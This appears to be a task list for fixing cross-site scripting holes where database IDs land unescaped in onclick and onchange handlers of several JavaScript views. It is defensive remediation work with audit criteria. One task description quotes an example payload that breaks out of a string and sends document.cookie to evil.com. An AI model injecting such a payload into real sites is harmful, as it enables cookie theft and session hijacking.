feature.title: Fix XSS vulnerabilities in onclick handlers

tasks.title: Fix unescaped database values in onclick JavaScript string literals (workspace-detail.js)
tasks.description: Task IDs (t.tid) from RTDB/demo-data land unescaped inside JavaScript string literals in onclick attributes. A malicious task ID like `');fetch('https://evil.com?'+document.cookie)//` would execute arbitrary JS. Wrap all with esc(): `onclick="${fn.deleteTask}('${esc(t.tid)}')"` and `onchange="${fn.toggleTask}('${esc(t.tid)}', !${t.completed})"`. Also fix timer string comparison (`timerElapsed > '07:00:00'` → numeric comparison using ms).
acceptanceCriteria: No other unescaped DB values in onclick/onchange/oninput attributes
Existing esc() calls on text content preserved

tasks.title: Fix unescaped database values in onclick handlers (webhooks.js)
tasks.description: Webhook subscription IDs (w.sid) from RTDB/demo-data land unescaped in onclick JS strings. Wrap with esc().
acceptanceCriteria: No other unescaped DB values in onclick attributes

tasks.title: Fix unescaped database values in onclick handlers (contacts.js)
tasks.description: Contact IDs (c.cid) from RTDB/demo-data land unescaped in onclick navigating to contact detail. Wrap with esc().
acceptanceCriteria: No other unescaped DB values in onclick attributes

tasks.title: Fix unescaped form field IDs in DOM id attributes (booking.js)
tasks.description: Form field IDs (f.id) from eventType.formFields used in DOM id attributes unescaped. While id attributes are not directly XSS-executable, special characters break DOM structure. Wrap with esc().
acceptanceCriteria: Form fields with special characters in IDs don't break DOM

tasks.title: Audit all onclick/onchange/oninput handlers across all view and component files
tasks.description: Run grep for `onclick=`, `onchange=`, `oninput=`, `onkeydown=` across all views/ and components/. Verify every template-expression value inside JS string literals is esc()-wrapped. Hardcoded strings (routes, labels from constants) are exempt.
acceptanceCriteria: Zero unescaped dynamic values in onclick/onchange/oninput/onkeydown JS string literals
Grep pattern: `on(click|change|input|keydown)="\$\{fn\.\w+\}\('[^')]*\$\{[^}]*\}` — all hits verified esc()-wrapped
Hardcoded routes from constants/nav.js verified safe (no user input)
No regression in any view rendering
